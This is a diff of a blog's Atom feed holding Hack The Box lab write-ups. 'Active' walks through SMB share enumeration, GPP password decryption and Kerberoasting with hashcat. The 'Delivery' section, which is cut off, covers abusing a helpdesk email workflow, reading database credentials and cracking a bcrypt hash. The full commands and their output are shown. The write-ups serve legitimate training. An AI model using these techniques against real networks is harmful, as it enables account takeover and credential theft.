@@ -1,4 +1,309 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-10-23T01:07:18+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">blackhawk0x</title><subtitle>Writeups, malware analysis, and reverse engineering notes by blackhawk0x.</subtitle><author><name>blackhawk0x</name></author><entry><title type="html">Hack The Box: Administrator</title><link href="http://localhost:4000/posts/administrator/" rel="alternate" type="text/html" title="Hack The Box: Administrator" /><published>2026-10-22T00:00:00+05:30</published><updated>2026-10-22T00:00:00+05:30</updated><id>http://localhost:4000/posts/administrator</id><content type="html" xml:base="http://localhost:4000/posts/administrator/"><![CDATA[<h1 id="htb-administrator">HTB Administrator</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-10-23T13:32:58+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">blackhawk0x</title><subtitle>Writeups, malware analysis, and reverse engineering notes by blackhawk0x.</subtitle><author><name>blackhawk0x</name></author><entry><title type="html">Hack The Box: Active</title><link href="http://localhost:4000/posts/active/" rel="alternate" type="text/html" title="Hack The Box: Active" /><published>2026-10-22T00:00:00+05:30</published><updated>2026-10-22T00:00:00+05:30</updated><id>http://localhost:4000/posts/active</id><content type="html" xml:base="http://localhost:4000/posts/active/"><![CDATA[<h1 id="htb-active">HTB Active</h1>
+
+<p><strong>Target:</strong> <code class="language-plaintext highlighter-rouge">10.129.8.52</code><br />
+<strong>Domain:</strong> <code class="language-plaintext highlighter-rouge">active.htb</code><br />
+<strong>Operating System:</strong> Windows Server 2008 R2 SP1<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Attack Path:</strong> SMB Enumeration → Group Policy Preferences (GPP) Password Disclosure → Service Account Access → Kerberoasting → Administrator Password Recovery</p>
+
+<hr />
+
+<h2 id="1-port-scanning-and-enumeration">1. Port Scanning and Enumeration</h2>
+
+<p>Start with an Nmap scan to identify open ports, running services, and the target’s likely role.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV 10.129.8.52 --min-rate 1000
+</code></pre></div></div>
+
+<h3 id="important-findings">Important findings</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Port</th>
+      <th>Service</th>
+      <th>Significance</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>53</td>
+      <td>DNS</td>
+      <td>Domain name resolution</td>
+    </tr>
+    <tr>
+      <td>88</td>
+      <td>Kerberos</td>
+      <td>Active Directory authentication</td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td>MSRPC</td>
+      <td>Windows RPC services</td>
+    </tr>
+    <tr>
+      <td>139, 445</td>
+      <td>NetBIOS/SMB</td>
+      <td>File shares and domain resources</td>
+    </tr>
+    <tr>
+      <td>389</td>
+      <td>LDAP</td>
+      <td>Active Directory directory queries</td>
+    </tr>
+    <tr>
+      <td>464</td>
+      <td>Kerberos password service</td>
+      <td>Password change operations</td>
+    </tr>
+    <tr>
+      <td>3268</td>
+      <td>Global Catalog</td>
+      <td>Forest-wide directory queries</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The LDAP service identifies the domain as <code class="language-plaintext highlighter-rouge">active.htb</code>, and the server hostname is <code class="language-plaintext highlighter-rouge">DC</code>. The combination of DNS, Kerberos, LDAP, and SMB strongly suggests that this machine is an Active Directory domain controller.</p>
+
+<p>SMB signing is enabled and required. This is useful to record, although it does not prevent the credential-disclosure and Kerberoasting techniques used in this attack.</p>
+
+<h2 id="2-enumerating-smb-shares">2. Enumerating SMB Shares</h2>
+
+<p>Attempt anonymous share enumeration:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -N -L '//10.129.8.52/'
+</code></pre></div></div>
+
+<p>The server permits anonymous authentication and reveals these shares:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sharename       Type
+---------       ----
+ADMIN$          Disk
+C$              Disk
+IPC$            IPC
+NETLOGON        Disk
+Replication     Disk
+SYSVOL          Disk
+Users           Disk
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">Replication</code> share is particularly interesting because it may contain replicated domain files or configuration data. <code class="language-plaintext highlighter-rouge">SYSVOL</code> is also important because domain controllers store Group Policy objects and logon scripts there.</p>
+
+<h3 id="inspect-the-replication-share">Inspect the Replication share</h3>
+
+<p>Connect without credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -N '//10.129.8.52/Replication'
+</code></pre></div></div>
+
+<p>Enumerate the directory structure and navigate to:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>active.htb/Policies/
+</code></pre></div></div>
+
+<p>Inside a Group Policy object’s directory, inspect:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{31B2F340-016D-11D2-945F-00C04FB984F9}/
+    MACHINE/
+        Preferences/
+            Groups/
+                Groups.xml
+</code></pre></div></div>
+
+<p>The GUID shown here is the default domain policy’s well-known GUID.</p>
+
+<p>Retrieve the file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get Groups.xml
+</code></pre></div></div>
+
+<h2 id="3-extracting-the-gpp-password">3. Extracting the GPP Password</h2>
+
+<p>Inspect the downloaded XML:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat Groups.xml
+</code></pre></div></div>
+
+<p>The relevant entry contains:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;User name="active.htb\SVC_TGS" ...&gt;
+    &lt;Properties
+        cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+        userName="active.htb\SVC_TGS"/&gt;
+&lt;/User&gt;
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">cpassword</code> attribute contains an encrypted password associated with a Group Policy Preferences account configuration.</p>
+
+<p>Historically, Group Policy Preferences could store passwords encrypted with a publicly documented AES key. Microsoft later addressed this insecure design, but old XML files can remain readable if they have not been removed.</p>
+
+<h3 id="decrypt-the-password">Decrypt the password</h3>
+
+<p>Use Impacket’s <code class="language-plaintext highlighter-rouge">gpp-decrypt</code> utility:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
+</code></pre></div></div>
+
+<p>Output:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GPPstillStandingStrong2k18
+</code></pre></div></div>
+
+<p>We now have credentials for:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: active.htb\SVC_TGS
+Password: GPPstillStandingStrong2k18
+</code></pre></div></div>
+
+<p><strong>Key lesson:</strong> This is not a password-cracking attack. The weakness is recoverable password storage in Group Policy Preferences.</p>
+
+<h2 id="4-accessing-the-users-share">4. Accessing the Users Share</h2>
+
+<p>Authenticate to the <code class="language-plaintext highlighter-rouge">Users</code> share using the recovered credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient '//10.129.8.52/Users' --user active.htb/svc_tgs
+</code></pre></div></div>
+
+<p>Enter the recovered password when prompted.</p>
+
+<p>List the share contents:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls
+</code></pre></div></div>
+
+<p>The listing includes directories such as:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Administrator/
+All Users/
+Default/
+Default User/
+Public/
+SVC_TGS/
+</code></pre></div></div>
+
+<p>Navigate to the service account’s Desktop:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd SVC_TGS
+cd Desktop
+ls
+</code></pre></div></div>
+
+<p>Download the user flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get user.txt
+</code></pre></div></div>
+
+<p>This confirms that the recovered service-account credentials provide access to the share and allow retrieval of the user flag.</p>
+
+<p><strong>Important distinction:</strong> Access to a share and possession of a user’s Windows logon session are not necessarily the same thing. SMB share permissions determine which files can be accessed; they do not automatically establish interactive access to the host.</p>
+
+<h2 id="5-enumerating-kerberoastable-accounts">5. Enumerating Kerberoastable Accounts</h2>
+
+<p>With valid domain credentials, enumerate accounts with Service Principal Names (SPNs) and request their service tickets:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetUserSPNs active.htb/svc_tgs -request
+
+Password:
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 00:36:40.351723  2026-10-22 11:28:56.155407             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$&lt;RDACTED&gt;
+</code></pre></div></div>
+
+<p>The account is also listed as a member of <code class="language-plaintext highlighter-rouge">Group Policy Creator Owners</code>.</p>
+
+<h3 id="why-is-this-interesting">Why is this interesting?</h3>
+
+<p>Kerberos uses Service Principal Names to associate services with accounts. A domain user with sufficient permissions can request a ticket for an SPN without knowing the target account’s password.</p>
+
+<p>When the service runs under a user account, the returned TGS ticket contains encrypted data derived from that account’s secret. An attacker can save the ticket and attempt to crack it offline.</p>
+
+<p>In this case, the SPN belongs to <code class="language-plaintext highlighter-rouge">Administrator</code>, making the ticket especially valuable.</p>
+
+<h2 id="6-cracking-the-administrators-kerberos-ticket">6. Cracking the Administrator’s Kerberos Ticket</h2>
+
+<p>Run Hashcat against the RockYou wordlist:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting in autodetect mode
+
+OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$&lt;REDACTED&gt;:&lt;PASSWORD&gt;
+</code></pre></div></div>
+
+<p>This demonstrates <strong>Kerberoasting</strong>: requesting a service ticket using valid domain credentials and attempting to recover the service account’s password offline.</p>
+
+<p>The attack is possible because the ticket can be requested legitimately, while password guesses are tested locally rather than sent repeatedly to the domain controller.</p>
+
+<h2 id="7-authenticate-as-administrator">7. Authenticate as Administrator</h2>
+
+<p>Test the recovered credentials against the SMB Users share:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient '//10.129.8.52/Users' --user active.htb/Administrator
+Password for [ACTIVE.HTB\Administrator]:
+Try "help" to get a list of possible commands.
+
+smb: \&gt; cd Administrator
+
+smb: \Administrator\&gt; cd Desktop
+
+smb: \Administrator\Desktop\&gt; get root.txt
+
+getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="attack-chain-summary">Attack Chain Summary</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Anonymous SMB enumeration
+        |
+        v
+Discover Replication share
+        |
+        v
+Read Groups.xml in SYSVOL-style policy structure
+        |
+        v
+Decrypt GPP cpassword
+        |
+        v
+Recover SVC_TGS credentials
+        |
+        v
+Access Users share and retrieve user.txt
+        |
+        v
+Enumerate SPNs with GetUserSPNs
+        |
+        v
+Request Administrator's TGS ticket
+        |
+        v
+Crack ticket offline with Hashcat
+        |
+        v
+Recover Administrator password
+        |
+        v
+Authenticate to SMB as Administrator
+        |
+        v
+Retrieve root.txt
+</code></pre></div></div>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="active-directory" /><category term="windows" /><category term="Active Directory" /><category term="Kerberoasting" /><category term="SMB Enumeration" /><category term="GPP" /><summary type="html"><![CDATA[HTB Active]]></summary></entry><entry><title type="html">Hack The Box: Administrator</title><link href="http://localhost:4000/posts/administrator/" rel="alternate" type="text/html" title="Hack The Box: Administrator" /><published>2026-10-22T00:00:00+05:30</published><updated>2026-10-22T00:00:00+05:30</updated><id>http://localhost:4000/posts/administrator</id><content type="html" xml:base="http://localhost:4000/posts/administrator/"><![CDATA[<h1 id="htb-administrator">HTB Administrator</h1>
 
 <h2 id="overview">Overview</h2>
 
@@ -437,312 +742,287 @@ ls
       <td>Authenticate as Administrator</td>
     </tr>
   </tbody>
-</table>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="active-directory" /><category term="windows" /><category term="BloodHound" /><category term="FTP" /><category term="Password Safe" /><category term="Kerberoasting" /><category term="Active Directory" /><summary type="html"><![CDATA[HTB Administrator]]></summary></entry><entry><title type="html">Hack The Box: Active</title><link href="http://localhost:4000/posts/active/" rel="alternate" type="text/html" title="Hack The Box: Active" /><published>2026-10-22T00:00:00+05:30</published><updated>2026-10-22T00:00:00+05:30</updated><id>http://localhost:4000/posts/active</id><content type="html" xml:base="http://localhost:4000/posts/active/"><![CDATA[<h1 id="htb-active">HTB Active</h1>
+</table>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="active-directory" /><category term="windows" /><category term="BloodHound" /><category term="FTP" /><category term="Password Safe" /><category term="Kerberoasting" /><category term="Active Directory" /><summary type="html"><![CDATA[HTB Administrator]]></summary></entry><entry><title type="html">Hack The Box: Delivery</title><link href="http://localhost:4000/posts/delivery/" rel="alternate" type="text/html" title="Hack The Box: Delivery" /><published>2026-10-22T00:00:00+05:30</published><updated>2026-10-22T00:00:00+05:30</updated><id>http://localhost:4000/posts/delivery</id><content type="html" xml:base="http://localhost:4000/posts/delivery/"><![CDATA[<h1 id="htb-delivery">HTB Delivery</h1>
 
-<p><strong>Target:</strong> <code class="language-plaintext highlighter-rouge">10.129.8.52</code><br />
-<strong>Domain:</strong> <code class="language-plaintext highlighter-rouge">active.htb</code><br />
-<strong>Operating System:</strong> Windows Server 2008 R2 SP1<br />
+<p><strong>Target:</strong> <code class="language-plaintext highlighter-rouge">10.129.8.154</code><br />
+<strong>Operating System:</strong> Linux (Debian)<br />
 <strong>Difficulty:</strong> Easy<br />
-<strong>Attack Path:</strong> SMB Enumeration → Group Policy Preferences (GPP) Password Disclosure → Service Account Access → Kerberoasting → Administrator Password Recovery</p>
+<strong>Attack Path:</strong> osTicket Email Disclosure → Mattermost Account Access → SSH → Password Hash Cracking → Root</p>
 
-<hr />
+<h2 id="1-enumeration">1. Enumeration</h2>
 
-<h2 id="1-port-scanning-and-enumeration">1. Port Scanning and Enumeration</h2>
+<p>I started with an Nmap scan to identify the target’s exposed services and determine which applications might provide an initial foothold.</p>
 
-<p>Start with an Nmap scan to identify open ports, running services, and the target’s likely role.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV 10.129.8.52 --min-rate 1000
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -p- --min-rate 1000 10.129.8.154 -oN nmap.txt
 </code></pre></div></div>
 
-<h3 id="important-findings">Important findings</h3>
+<p>The relevant results were:</p>
 
 <table>
   <thead>
     <tr>
       <th>Port</th>
       <th>Service</th>
-      <th>Significance</th>
+      <th>Details</th>
     </tr>
   </thead>
   <tbody>
     <tr>
-      <td>53</td>
-      <td>DNS</td>
-      <td>Domain name resolution</td>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 7.9p1</td>
     </tr>
     <tr>
-      <td>88</td>
-      <td>Kerberos</td>
-      <td>Active Directory authentication</td>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>nginx 1.14.2</td>
     </tr>
     <tr>
-      <td>135</td>
-      <td>MSRPC</td>
-      <td>Windows RPC services</td>
-    </tr>
-    <tr>
-      <td>139, 445</td>
-      <td>NetBIOS/SMB</td>
-      <td>File shares and domain resources</td>
-    </tr>
-    <tr>
-      <td>389</td>
-      <td>LDAP</td>
-      <td>Active Directory directory queries</td>
-    </tr>
-    <tr>
-      <td>464</td>
-      <td>Kerberos password service</td>
-      <td>Password change operations</td>
-    </tr>
-    <tr>
-      <td>3268</td>
-      <td>Global Catalog</td>
-      <td>Forest-wide directory queries</td>
+      <td>8065</td>
+      <td>HTTP</td>
+      <td>Mattermost 5.30.0</td>
     </tr>
   </tbody>
 </table>
 
-<p>The LDAP service identifies the domain as <code class="language-plaintext highlighter-rouge">active.htb</code>, and the server hostname is <code class="language-plaintext highlighter-rouge">DC</code>. The combination of DNS, Kerberos, LDAP, and SMB strongly suggests that this machine is an Active Directory domain controller.</p>
+<p>The web services exposed two interesting applications:</p>
 
-<p>SMB signing is enabled and required. This is useful to record, although it does not prevent the credential-disclosure and Kerberoasting techniques used in this attack.</p>
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">http://helpdesk.delivery.htb</code> — osTicket</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">http://delivery.htb:8065</code> — Mattermost</p>
+  </li>
+</ul>
 
-<h2 id="2-enumerating-smb-shares">2. Enumerating SMB Shares</h2>
+<p>I added the hostnames to my local <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
 
-<p>Attempt anonymous share enumeration:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -N -L '//10.129.8.52/'
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "10.129.8.154 delivery.htb helpdesk.delivery.htb" | sudo tee -a /etc/hosts
 </code></pre></div></div>
 
-<p>The server permits anonymous authentication and reveals these shares:</p>
+<h3 id="11-osticket">1.1 osTicket</h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sharename       Type
----------       ----
-ADMIN$          Disk
-C$              Disk
-IPC$            IPC
-NETLOGON        Disk
-Replication     Disk
-SYSVOL          Disk
-Users           Disk
+<p>The helpdesk application allowed visitors to create support tickets without an existing account. After submitting a ticket, osTicket provided a ticket ID and an associated email address in the format:</p>
+
+<p><img src="/assets/images/delivery_osticket_1.png" alt="OSTicket 1" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ticket_id&gt;@delivery.htb
 </code></pre></div></div>
 
-<p>The <code class="language-plaintext highlighter-rouge">Replication</code> share is particularly interesting because it may contain replicated domain files or configuration data. <code class="language-plaintext highlighter-rouge">SYSVOL</code> is also important because domain controllers store Group Policy objects and logon scripts there.</p>
+<p>I also received the information needed to check the ticket’s status and view its conversation thread.</p>
 
-<h3 id="inspect-the-replication-share">Inspect the Replication share</h3>
+<h3 id="12-mattermost">1.2 Mattermost</h3>
 
-<p>Connect without credentials:</p>
+<p>Mattermost was accessible on port 8065. I attempted to register a new account, but the application required email verification. Since Mattermost accepted addresses ending in <code class="language-plaintext highlighter-rouge">delivery.htb</code>, I needed a way to receive a verification link sent to that domain.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -N '//10.129.8.52/Replication'
+<p>Rather than abandoning the registration process, I investigated whether the helpdesk application could be used to retrieve the verification email.</p>
+
+<h2 id="2-exploiting-the-email-workflow">2. Exploiting the Email Workflow</h2>
+
+<p>OsTicket assigned a delivery.htb email address to newly created tickets, and its ticket thread displayed messages associated with the ticket.</p>
+
+<p>I used this workflow to obtain a Mattermost account.</p>
+
+<ol>
+  <li>
+    <p>Created a new support ticket through osTicket.</p>
+  </li>
+  <li>
+    <p>Recorded the ticket ID and the email address assigned to it.</p>
+  </li>
+  <li>
+    <p>Opened the ticket thread using the ticket ID and the email address originally supplied when creating the ticket.</p>
+  </li>
+  <li>
+    <p>Started a Mattermost registration using the ticket-associated email address.</p>
+  </li>
+  <li>
+    <p>Mattermost sent an account-verification link to that address.</p>
+  </li>
+</ol>
+
+<p><img src="/assets/images/delivery_osticket_2.png" alt="OSTicket 1" /></p>
+
+<ol>
+  <li>
+    <p>Returned to the osTicket ticket thread and retrieved the verification link.</p>
+  </li>
+  <li>
+    <p>Opened the link to verify the Mattermost account and logged in.</p>
+  </li>
+</ol>
+
+<p>This worked because the helpdesk workflow exposed the verification message through the ticket thread. The email address did not need to belong to a conventional mailbox that I could access separately; the application itself provided a way to view the message.</p>
+
+<p>After verification, I was able to access Mattermost and join the internal team.</p>
+
+<h2 id="3-enumerating-mattermost">3. Enumerating Mattermost</h2>
+
+<p>After gaining access to Mattermost, I explored the internal channels for information that could help with further access.</p>
+
+<p>One of the messages posted by <code class="language-plaintext highlighter-rouge">root</code> in the developers’ channel contained two important clues:</p>
+
+<p><img src="/assets/images/delivery_mattermost_1.png" alt="MatterMost 1" /></p>
+
+<p>The message disclosed SSH credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: maildeliverer
+Password: &lt;REDACTED&gt;
 </code></pre></div></div>
 
-<p>Enumerate the directory structure and navigate to:</p>
+<p>It also hinted that users might choose passwords derived from <code class="language-plaintext highlighter-rouge">PleaseSubscribe!</code>.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>active.htb/Policies/
+<p>The first clue provided a direct route to the target system. The second suggested a potential password-cracking strategy for later in the attack.</p>
+
+<h2 id="4-initial-foothold-via-ssh">4. Initial Foothold via SSH</h2>
+
+<p>Using the credentials obtained from Mattermost, I connected to the target over SSH.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh maildeliverer@10.129.8.154
 </code></pre></div></div>
 
-<p>Inside a Group Policy object’s directory, inspect:</p>
+<p>After successfully authenticating, I began enumerating the host for application files, configuration files, and other credentials.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{31B2F340-016D-11D2-945F-00C04FB984F9}/
-    MACHINE/
-        Preferences/
-            Groups/
-                Groups.xml
+<p>During enumeration, I discovered the Mattermost installation under <code class="language-plaintext highlighter-rouge">/opt/mattermost</code>.</p>
+
+<h2 id="5-extracting-mattermost-database-credentials">5. Extracting Mattermost Database Credentials</h2>
+
+<p>Mattermost’s configuration file contained the database connection settings:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /opt/mattermost/config/config.json
 </code></pre></div></div>
 
-<p>The GUID shown here is the default domain policy’s well-known GUID.</p>
+<p>The relevant configuration was:</p>
 
-<p>Retrieve the file:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get Groups.xml
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"SqlSettings": {
+    "DriverName": "mysql",
+    "DataSource": "mmuser:&lt;REDACTED&gt;@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8&amp;readTimeout=30s&amp;writeTimeout=30s"
+}
 </code></pre></div></div>
 
-<h2 id="3-extracting-the-gpp-password">3. Extracting the GPP Password</h2>
+<p>This revealed the database credentials:</p>
 
-<p>Inspect the downloaded XML:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat Groups.xml
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: mmuser
+Password: &lt;REDACTED&gt;
+Database: mattermost
 </code></pre></div></div>
 
-<p>The relevant entry contains:</p>
+<p>Since the database was listening on localhost, I could access it from my existing SSH session.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;User name="active.htb\SVC_TGS" ...&gt;
-    &lt;Properties
-        cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
-        userName="active.htb\SVC_TGS"/&gt;
-&lt;/User&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql -u mmuser -p
 </code></pre></div></div>
 
-<p>The <code class="language-plaintext highlighter-rouge">cpassword</code> attribute contains an encrypted password associated with a Group Policy Preferences account configuration.</p>
+<p>After entering the password, I listed the available databases and connected to Mattermost.</p>
 
-<p>Historically, Group Policy Preferences could store passwords encrypted with a publicly documented AES key. Microsoft later addressed this insecure design, but old XML files can remain readable if they have not been removed.</p>
-
-<h3 id="decrypt-the-password">Decrypt the password</h3>
-
-<p>Use Impacket’s <code class="language-plaintext highlighter-rouge">gpp-decrypt</code> utility:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SHOW DATABASES;
+USE mattermost;
+SHOW TABLES;
 </code></pre></div></div>
 
-<p>Output:</p>
+<p>The <code class="language-plaintext highlighter-rouge">Users</code> table was particularly interesting because it contained account information and password hashes.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GPPstillStandingStrong2k18
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT Username, Password, Email, Roles
+FROM Users;
 </code></pre></div></div>
 
-<p>We now have credentials for:</p>
+<p>The results included a <code class="language-plaintext highlighter-rouge">root</code> account with the role <code class="language-plaintext highlighter-rouge">system_admin system_user</code> and a bcrypt password hash.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: active.htb\SVC_TGS
-Password: GPPstillStandingStrong2k18
+<p>At this point, I had obtained the hash but not the plaintext password.</p>
+
+<h2 id="6-cracking-the-mattermost-root-password">6. Cracking the Mattermost Root Password</h2>
+
+<p>The developers’ channel had explicitly mentioned password reuse and variations of:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PleaseSubscribe!
 </code></pre></div></div>
 
-<p><strong>Key lesson:</strong> This is not a password-cracking attack. The weakness is recoverable password storage in Group Policy Preferences.</p>
+<p>Instead of starting with a large, generic password dictionary, I used this information to build a targeted wordlist.</p>
 
-<h2 id="4-accessing-the-users-share">4. Accessing the Users Share</h2>
+<h3 id="61-generating-password-candidates">6.1 Generating password candidates</h3>
 
-<p>Authenticate to the <code class="language-plaintext highlighter-rouge">Users</code> share using the recovered credentials:</p>
+<p>First, I created a file containing the base password.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient '//10.129.8.52/Users' --user active.htb/svc_tgs
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 'PleaseSubscribe!' &gt; password.list
 </code></pre></div></div>
 
-<p>Enter the recovered password when prompted.</p>
+<p>I then applied Hashcat’s <code class="language-plaintext highlighter-rouge">best66.rule</code> to generate variations of the phrase.</p>
 
-<p>List the share contents:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -r /usr/share/hashcat/rules/best66.rule \
+  password.list --stdout &gt; guess_password.list
 </code></pre></div></div>
 
-<p>The listing includes directories such as:</p>
+<p>Rule-based mutations can produce candidates involving capitalization changes, appended numbers, and other common modifications. This approach is useful when an application explicitly hints at a password pattern.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Administrator/
-All Users/
-Default/
-Default User/
-Public/
-SVC_TGS/
+<h3 id="62-extracting-and-cracking-the-hash">6.2 Extracting and cracking the hash</h3>
+
+<p>From the database results, I extracted the hash belonging to the Mattermost <code class="language-plaintext highlighter-rouge">root</code> account and saved it in <code class="language-plaintext highlighter-rouge">hash.txt</code>.</p>
+
+<p>The hash used the bcrypt format, identified by the <code class="language-plaintext highlighter-rouge">$2a$</code> prefix and cost factor <code class="language-plaintext highlighter-rouge">10</code>. Hashcat supports this format with mode <code class="language-plaintext highlighter-rouge">3200</code>.</p>
+
+<p>I ran:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 3200 hash.txt \
+  --wordlist ./guess_password.list
 </code></pre></div></div>
 
-<p>Navigate to the service account’s Desktop:</p>
+<p>Hashcat successfully recovered the password</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd SVC_TGS
-cd Desktop
